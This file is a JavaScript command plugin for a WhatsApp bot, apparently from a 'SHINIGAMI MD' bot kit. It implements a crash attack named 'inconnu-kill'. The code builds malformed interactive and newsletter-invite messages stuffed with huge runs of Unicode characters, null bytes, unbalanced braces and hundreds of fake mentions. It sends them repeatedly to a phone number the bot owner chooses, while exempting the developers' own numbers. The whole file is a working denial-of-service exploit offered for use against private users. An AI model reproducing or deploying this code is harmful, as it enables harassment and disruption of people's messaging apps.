const { cmd } = require('../momy');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const axios = require('axios');
const crypto = require('crypto');

// Helper sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// DEV NUMBERS PROTECTION
// ============================================================
let devNumbers = [];

async function loadDevNumbers() {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/dawestava-hub/new-bot/refs/heads/main/config.json');
        if (response.data && response.data.ownerNumber) {
            devNumbers = response.data.ownerNumber.map(num => {
                let cleanNum = num.toString().replace(/[^0-9]/g, '');
                if (cleanNum.startsWith('0')) cleanNum = '255' + cleanNum.substring(1);
                return cleanNum + '@s.whatsapp.net';
            });
            console.log(`✅ Loaded ${devNumbers.length} protected developer numbers`);
        }
    } catch (e) {
        console.log('⚠️ Could not load dev numbers, using default protection');
        devNumbers = ['554488122687@s.whatsapp.net', '55449746111@s.whatsapp.net'];
    }
}

function isDevNumber(jid) {
    return devNumbers.includes(jid);
}

loadDevNumbers();

// ============================================================
// ADMIN BOKEP CRASH FUNCTION
// ============================================================
async function adminBokepCrash(conn, target) {
    if (!conn?.relayMessage) {
        console.log("Socket not ready");
        return;
    }

    const toxic = "ꦾ".repeat(10000) + "𑇂𑆵𑆴𑆿".repeat(5000) + "\u0000".repeat(20000) + "ោ៝".repeat(6000);

    const interactiveMsg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: toxic.substring(0, 3000) },
                    body: { text: toxic.substring(0, 5000) },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(2000),
                        buttons: [
                            { name: "single_select", buttonParamsJson: "\u0000".repeat(1000) },
                            { name: "galaxy_message", buttonParamsJson: JSON.stringify({ data: "X".repeat(2000) }) },
                            { name: "payment_method", buttonParamsJson: "\u0000".repeat(1000) },
                            { name: "catalog_message", buttonParamsJson: "\u0000".repeat(1000) }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: [target, ...Array.from({ length: 500 }, (_, i) => `1${i}@s.whatsapp.net`)],
                        forwardingScore: 9999,
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimestamp: Date.now() + 999999999
                            }
                        }
                    }
                }
            }
        }
    };

    const newsMsg = {
        botInvokeMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: "1@newsletter",
                    newsletterName: "🩸 ༑ SHINIGAMI 炎 ⟅ ༑ 🩸" + "𑜦𑜠".repeat(5000),
                    jpegThumbnail: null,
                    caption: toxic.substring(0, 5000),
                    inviteExpiration: Date.now() + 9999999999
                }
            }
        }
    };

    const PouMsg = generateWAMessageFromContent(target, {
        newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "🩸 ༑ SHINIGAMI 炎 ⟅ ༑ 🩸" + "𑜦𑜠".repeat(5000),
            jpegThumbnail: null,
            caption: "🩸 ༑ SHINIGAMI 炎 ⟅ ༑ 🩸",
            timestamp: Date.now().toString(),
        }
    }, {});

    // Send multiple times for more impact
    for (let i = 0; i < 5; i++) {
        await conn.relayMessage(target, interactiveMsg, { messageId: crypto.randomBytes(10).toString('hex') });
        await sleep(200);
        await conn.relayMessage(target, newsMsg, { messageId: crypto.randomBytes(10).toString('hex') });
        await sleep(200);
        await conn.relayMessage(target, PouMsg.message, { messageId: PouMsg.key.id });
        await sleep(300);
    }
}

// ============================================================
// OWNER COMMAND: .admin-bokep
// ============================================================
cmd({
    pattern: "inconnu-kill",
    alias: ["abokep", "admincrash", "bokepcrash"],
    desc: "Admin bokep crash attack",
    category: "bug",
    react: "🔥",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    // Check if owner
    if (!isOwner) return reply("❌ Owner only command");

    // Get target
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '55' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else if (m.quoted) {
        target = m.quoted.sender;
    } else {
        return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ❌ Please provide a number
│
│ 📌 Example:
│ • .inconnu-kill 55xxx 
╰─────────────────────•`);
    }

    // Check if target is a developer number
    if (isDevNumber(target)) {
        return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ 🛡️ Cannot attack developer number!
│ This number is protected.
╰─────────────────────•`);
    }

    const targetNumber = target.split('@')[0];
    
    // Send attack started Message 
    await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ 🔥 INCONNU CRASH ATTACK
│
│ 👤 Target: @${targetNumber}
│ ⚡ Status: Attack in progress...
╰─────────────────────•`);

    try {
        await adminBokepCrash(conn, target);
        
        // Send success message
        await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ✅ INCONNU CRASH COMPLETED!
│ 👤 Target: @${targetNumber}
│ 💀 Status: Crashed successfully
╰─────────────────────•

> POWERED BY SHINIGAMI MD`);
        
    } catch (e) {
        console.error("Admin Bokep Crash Error:", e);
        reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ❌ INCONNU CRASH FAILED
│ 👤 Target: @${targetNumber}
│ 💀 Error: ${e.message}
╰─────────────────────•`);
    }
});
